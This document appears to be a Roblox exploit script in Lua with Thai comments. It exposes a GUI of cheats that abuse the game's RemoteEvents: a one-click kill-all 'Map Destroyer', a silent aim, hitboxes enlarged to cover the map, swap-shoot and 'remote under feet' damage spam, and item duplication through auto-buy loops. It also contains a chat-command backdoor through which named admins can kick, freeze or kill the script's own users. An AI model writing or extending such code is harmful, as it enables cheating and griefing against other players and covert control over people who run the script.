...
local hitboxSize = 10000 -- ปรับขนาดให้ใหญ่ครอบคลุมทั้งแมพ (ป้องกันคนไม่โดน)
...
local burstAmount = 5
local mapDestroyerEnabled = false -- New variable

local remoteFeetV1 = false
local remoteFeetV2 = false
local remoteFeetV3 = false
local swapShootV1 = false
local swapShootV2 = false
local swapShootV3 = false
...
local function getUltimateTargetPos(target)
    ...
    if head and root then
        ...
        if vel.Y > 5 then prediction = prediction - Vector3.new(0, 0.8, 0) end
        return prediction
    end
    return nil
end

-- [ UPDATED: ADVANCED SHOOTING & REMOTE MIGRATION ]
local function advancedSwapShoot(target, mode)
    local char = plr.Character
    ...
    local guns = {}
    for _, v in ipairs(plr.Backpack:GetChildren()) do if v:IsA("Tool") and v.Name ~= "Phone" and v.Name ~= "Boombox" then table.insert(guns, v) end end
    ...
    for i, gun in ipairs(guns) do
        task.spawn(function()
            -- บังคับถือและยิงแบบเสี้ยววินาทีเพื่อให้ Remote ย้ายตามมาที่ตัว
            char.Humanoid:EquipTool(gun)
            local remote = gun:FindFirstChild("shot") or gun:FindFirstChild("RemoteEvent")
            if remote then
                local shootAt = (mode == "feet") and (targetRoot.Position - Vector3.new(0, 3, 0)) or aimPos
                -- ยิงเป็นชุด (Burst) ตามที่สั่ง
                local loopCount = burstFireEnabled and burstAmount or 3
                for b = 1, loopCount do
                    remote:FireServer(shootAt)
                end
            end
            -- ดีดกลับเข้า Backpack ทันทีเพื่อความเนียนและให้ Remote อัปเดตตำแหน่งตามเรามา
            gun.Parent = plr.Backpack 
        end)
        -- ความเร็วในการวนลูปสลับปืน
        if i % 2 == 0 then RunService.Heartbeat:Wait() end
    end
end
...
local function runAdminCommand(sender, message)
    ...
    if isAdminSender then
        if cmd == "!cmd" then sendScriptMsg("Commands List", "!kick, !freeze, !r, !firefly...") end
        if targetInput then
            local targetPlayer = nil
            for _, p in ipairs(game.Players:GetPlayers()) do
                if string.find(string.lower(p.Name), string.lower(targetInput)) then targetPlayer = p break end
            end
            if targetPlayer then
                if cmd == "!kick" then
                    if targetPlayer == plr and not (plr.Name == "ffsww_1007" or plr.Name == "A_ASPD") then plr:Kick("Kicked by Admin") end
                elseif cmd == "!freeze" then
                    if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then targetPlayer.Character.HumanoidRootPart.Anchored = true end
                elseif cmd == "!r" then
                    if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then targetPlayer.Character.Humanoid.Health = 0 end
                end
            end
        end
...
for _, p in ipairs(game.Players:GetPlayers()) do p.Chatted:Connect(function(msg) runAdminCommand(p, msg) end) end
game.Players.PlayerAdded:Connect(function(p) p.Chatted:Connect(function(msg) runAdminCommand(p, msg) end) end)
...
mainTab.newLabel("--- [ ULTIMATE MAP DESTROYER ] ---")
mainTab.newToggle("MAP DESTROYER (1-CLICK KILL ALL)", "Kill every player in the server instantly", false, function(state)
    mapDestroyerEnabled = state
    task.spawn(function()
        while mapDestroyerEnabled do
            local guns = {}
            for _, v in ipairs(plr.Backpack:GetChildren()) do if v:IsA("Tool") and v.Name ~= "Phone" and v.Name ~= "Boombox" then table.insert(guns, v) end end
            if #guns > 0 then
                for _, target in ipairs(game.Players:GetPlayers()) do
                    if target ~= plr and not table.find(scriptAdmins, target.Name) and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                        local tRoot = target.Character.HumanoidRootPart
                        -- ยิงถล่มด้วยความเร็วสูงสุดพร้อมกันแบบเสี้ยววินาที
                        task.spawn(function()
                            local gun = guns[math.random(1, #guns)]
                            local remote = gun:FindFirstChild("shot") or gun:FindFirstChild("RemoteEvent")
                            if remote then
                                -- ส่งดาเมจ 50 นัดในครั้งเดียวเพื่อให้ตายคาที่
                                for i = 1, 50 do 
            ...
            task.wait() -- รันซ้ำทันทีที่ทำได้
        end
    end)
end)

mainTab.newLabel("--- Remote Under Feet (ใต้ตีน) ---")
mainTab.newToggle("Remote Feet V1 (Lock-On)", "Shoot under feet of closest target", false, function(state)
    remoteFeetV1 = state
    task.spawn(function()
        while remoteFeetV1 do
            local target = getClosestPlayer(1000)
            if target then advancedSwapShoot(target, "feet") end
            task.wait(0.05)
        end
    end)
end)

mainTab.newToggle("Remote Feet V2 (Fast Swap)", "Insane Speed Remote Under Feet", false, function(state)
    remoteFeetV2 = state
    task.spawn(function()
        while remoteFeetV2 do
...
mainTab.newToggle("Remote Feet V3 (Target Input)", "Use Target Name for Remote Under Feet", false, function(state)
    remoteFeetV3 = state
    task.spawn(function()
        while remoteFeetV3 do
            if targetSearchName ~= "" then
                for _, v in ipairs(game.Players:GetPlayers()) do
                    if v.Name:lower():find(targetSearchName:lower()) and v.Character then
                        advancedSwapShoot(v, "feet")
                        break
                    end
                end
            end
...
mainTab.newLabel("--- Ultra Swap Shoot (สลับปืนแรง) ---")
mainTab.newToggle("Swap Shoot V1 (Standard)", "High Damage Swap Shoot", false, function(state)
    swapShootV1 = state
    task.spawn(function()
        while swapShootV1 do
            local target = getClosestPlayer(1000)
            if target then advancedSwapShoot(target, "swap") end
            task.wait(0.1)
        end
    end)
end)

mainTab.newToggle("Swap Shoot V2 (Precision)", "High Accuracy Predict Swap", false, function(state)
    swapShootV2 = state
    task.spawn(function()
        while swapShootV2 do
...
mainTab.newToggle("Swap Shoot V3 (God Mode)", "Destroy everything with Swap Speed", false, function(state)
    swapShootV3 = state
    task.spawn(function()
        while swapShootV3 do
            local target = getClosestPlayer(2000)
            if target then 
                task.spawn(advancedSwapShoot, target, "swap")
                task.spawn(advancedSwapShoot, target, "swap") 
            end
            task.wait(0.01)
        end
...
mainTab.newLabel("--- Original Combat ---")
mainTab.newToggle("GOD BURST SHOT", "Shoot multi-bullets in one go", false, function(state) burstFireEnabled = state end)
mainTab.newSlider("Burst Count", "Bullets per shot", 20, false, 5, function(v) burstAmount = v end)

mainTab.newToggle("Ultimate Boss Hunter (FOLLOW)", "Guns orbit you & AUTO-SHOOT", false, function(state)
            ...
            for i, gun in ipairs(guns) do
                ...
                if handle then
                    ...
                    if targetPos then
                        ...
                        if remote then 
                            local loopCount = burstFireEnabled and burstAmount or 1
                            for b = 1, loopCount do remote:FireServer(targetPos) end
                        end
...
mainTab.newToggle("Boss Hunter Spin (Only Visual)", "Spin guns around you", false, function(state)
        ...
        while bossHunterSpin do
            ...
            for i, gun in ipairs(guns) do
                ...
                if handle then
                    ...
                    bp.MaxForce = Vector3.new(1,1,1) * 10^9 bp.P = 150000 bg.MaxTorque = Vector3.new(1,1,1) * 10^9 bg.P = 150000
                    bp.Position = orbitPos
                ...
                if tRoot and tHum and tHum.Health > 0 then
                    ...
                    if handle then
                        ...
                        if remote then
                            ...
                            local loopCount = burstFireEnabled and burstAmount or 1
                            for b = 1, loopCount do remote:FireServer(finalAim) end
                        end
                    end
                    task.wait(0.02)
                end
...
mainTab.newToggle("Sky Gun Sentry (Follow Me/Target)", "Guns fly above you", false, function(state)
...
mainTab.newToggle("Click Target to Warp & Kill", "Click player to eliminate", false, function(state) clickKillEnabled = state end)
...
mainTab.newToggle("Ultimate Gun Circle & Shoot", "Orbit all guns", false, function(state)
        ...
        while gunOrbitEnabled do
            ...
            for i, gun in ipairs(guns) do
                ...
                if handle then
                    ...
                    bp.MaxForce = Vector3.new(1,1,1) * 10^9 bp.P = 100000 bg.MaxTorque = Vector3.new(1,1,1) * 10^9 bg.P = 100000
                    bp.Position = orbitPos
                    if targetPos then
                        bg.CFrame = CFrame.new(orbitPos, targetPos)
                        local remote = gun:FindFirstChild("shot") or gun:FindFirstChild("RemoteEvent")
...
mainTab.newToggle("ULTIMATE SILENT AIM", "100% Accuracy with Prediction", false, function(state)
    silentAimKill = state
    task.spawn(function()
        while silentAimKill do
            ...
            if target then
                ...
                if aimPos then
                    ...
                    if phone then
                        local wasInBackpack = phone.Parent == plr.Backpack
                        if wasInBackpack then
                            plr.Character.Humanoid:EquipTool(phone)
                        end
        ...
        while hitboxEnabled do
            for _, v in ipairs(game.Players:GetPlayers()) do
                if v ~= plr and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
                    -- ขยายทุกส่วนของร่างกายเพื่อให้โดนดาเมจแน่นอนขึ้น
...
mainTab.newToggle("Warp & Orbit Spin", "Spin around target", false, function(state)
...
mainTab.newInput("Target Name", "Enter player name", function(t) targetSearchName = t end)
...
-- [ VISUALS TAB REMOVED - Keeping only COMBAT and AUTO SHOP ]

-- [ AUTO FARM TAB REMOVED - Keeping only COMBAT and AUTO SHOP ]

---------------------------------------------------------
-- [ TAB 2: AUTO SHOP ]
---------------------------------------------------------
local shopTab = DrRayLibrary.newTab("Auto Shop", "rbxassetid://10734951151")
shopTab.newToggle("Auto Claim Items", "Retrieve items automatically", false, function(state) autoClaimEnabled = state end)
shopTab.newButton("Manual Claim (Once)", "Click to claim items once", function() game:GetService("ReplicatedStorage").GetItemBack:FireServer() end)
...
local function findAndClick(targetPos)
    ...
    for _, v in ipairs(game.Workspace:GetDescendants()) do
        if v:IsA("ClickDetector") then
            local part = v.Parent
            if part and part:IsA("BasePart") and (part.Position - targetPos).Magnitude < 10 then closestClick = v break end
        end
    end
    if closestClick then 
        if fireclickdetector then fireclickdetector(closestClick) 
        else
            local char = plr.Character
...
shopTab.newToggle("Auto Buy Gun Loop (Max 10)", "Dup up to 10 items", false, function(state)
    autoBuyLoop = state
...
shopTab.newToggle("Auto Buy Phone Loop (Max 10)", "Dup items", false, function(state)
...
shopTab.newToggle("Auto Buy Boombox Loop (Max 10)", "Dup items", false, function(state)
...
-- [ MISC TAB REMOVED - Script now only has COMBAT and AUTO SHOP tabs ]
